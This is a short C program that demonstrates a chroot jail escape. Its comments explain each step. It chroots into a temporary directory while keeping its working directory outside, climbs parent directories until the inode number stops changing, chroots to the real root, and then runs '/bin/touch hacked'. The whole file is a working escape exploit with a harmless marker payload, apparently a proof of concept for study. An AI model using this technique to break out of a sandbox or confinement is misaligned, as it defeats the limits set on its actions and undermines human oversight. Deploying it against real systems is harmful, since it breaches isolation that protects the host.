#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

// You can run this command in the actual root directory.
char *commands[] = {"/bin/touch", "hacked", NULL};

int main(int argc, char **argv) {
  if (chdir("/") < 0) {
    perror("chdir to root");
		return 1;
	}

  char template[] = "chroot-jailbreak-XXXXXX";
  char *dir = mkdtemp(template);
  if (dir == NULL) {
    perror("mkdtemp");
    return 1;
  }
  // chroot to the temporary directory.
  // The important thing is the current directory is outside of the root because does not chdir to the new root directory.
  if (chroot(dir) < 0) {
    perror("chroot to tmp dir");
    return 1;
  }

  ino_t ino = 0;
  while (1) {
    struct stat st;
    if (stat(".", &st) < 0) {
      perror("stat");
      return 1;
    }

    // If the inode number does not change, assuming that the current directory is the real root.
    if (st.st_ino == ino) break;
    ino = st.st_ino;
    // If the inode number changes, move to a parent directory.
    printf("Move to parent dir. current inode: %ld\n", st.st_ino);
    if (chdir("..") < 0) {
      perror("chdir to parent dir");
      return 1;
    }
  }

  // Finally reach the real root, chroot to the current directory (which is the real root).
  if (chroot(".") < 0) {
    perror("chroot to real root");
    return 1;
  }
  printf("Escaped from chroot jail\n");

  printf("Run commands in real root...\n");
  if (execv(commands[0], commands) < 0) {
    perror("execv");
  }
  return 0;
}
